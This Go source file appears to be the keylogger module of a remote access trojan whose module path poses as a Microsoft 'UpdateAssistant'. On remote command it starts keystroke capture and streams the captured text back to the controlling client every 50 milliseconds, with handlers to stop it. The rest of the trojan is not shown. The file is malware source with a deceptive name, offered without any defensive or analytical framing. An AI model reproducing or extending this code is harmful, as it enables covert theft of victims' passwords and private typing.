package keylog

import (
	"encoding/json"
	"time"

	"github.com/microsoft/UpdateAssistant/modules/sysutil"
	"github.com/microsoft/UpdateAssistant/modules/transport"
)

func Handle(client *transport.Client, msgType string, payload json.RawMessage) {
	switch msgType {
	case "keylog_open", "keylog_refresh":
		if sysutil.KeylogStart() {
			go stream(client)
		}
		client.Send("keylog_state", map[string]interface{}{"active": true})
	case "keylog_close":
		sysutil.KeylogStop()
		client.Send("keylog_state", map[string]interface{}{"active": false})
	case "keylog_stop":
		sysutil.KeylogStop()
		client.Send("keylog_state", map[string]interface{}{"active": false})
	}
}

func stream(client *transport.Client) {
	for {
		if !sysutil.KeylogActive() {
			return
		}
		text := sysutil.KeylogGet()
		if text != "" {
			client.Send("keylog_data", map[string]interface{}{"text": text})
		}
		time.Sleep(50 * time.Millisecond)
	}
}
